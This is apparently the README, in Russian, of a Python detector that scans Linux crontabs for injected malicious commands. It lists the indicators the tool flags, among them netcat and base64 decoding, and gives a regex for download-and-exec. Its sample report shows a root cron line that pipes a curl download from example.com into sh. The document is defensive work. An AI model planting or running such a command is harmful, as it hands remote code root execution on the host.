# Cron Injection Detector

Минимальный детектор потенциальных инъекций в `cron` для Linux. Скрипт читает системные и пользовательские crontab’ы, а также директории `cron.*`, ищет подозрительные паттерны (download‑and‑exec, base64‑декодирование, inline‑exec, netcat, временные пути и т.п.) и формирует отчёт.

## Возможности

- Сканирует:
  - `/etc/crontab`
  - `/etc/cron.d/*`
  - пользовательские crontab’ы: `/var/spool/cron`, `/var/spool/cron/crontabs`
  - скрипты: `/etc/cron.hourly`, `/etc/cron.daily`, `/etc/cron.weekly`, `/etc/cron.monthly`
- Ищет набор типичных индикаторов компрометации в командах.
- Сортирует находки по уровню критичности (`high`, `medium`, `low`, `info`).
- Поддерживает дополнительные пути для проверки.

## Требования

- Linux (cron‑структуры и пути).
- Python 3.8+ (рекомендуется).

## Установка

Никаких зависимостей нет. Достаточно Python.

## Использование

Базовый запуск:
```bash
python main.py
```

Сканирование дополнительных путей и вывод в файл:
```bash
python main.py --paths /etc/cron.d /var/spool/cron --output /tmp/cron_report.txt
```

## Формат вывода

Каждая находка выводится блоком:
- уровень критичности
- источник (файл) и номер строки
- сработавший паттерн
- команда

Пример:
```
[HIGH] /etc/cron.d/suspicious:3 download-and-exec (shell)
  pattern: \b(curl|wget)\b.*\|\s*(bash|sh|zsh|ksh)
  command: * * * * * root curl http://example.com/p.sh | sh
```

## Важно

Этот помогает быстро найти подозрительные конструкции, но:
- не гарантирует наличие вредоноса;
- не заменяет проверку журналов, контроль целостности и анализ сетевой активности.
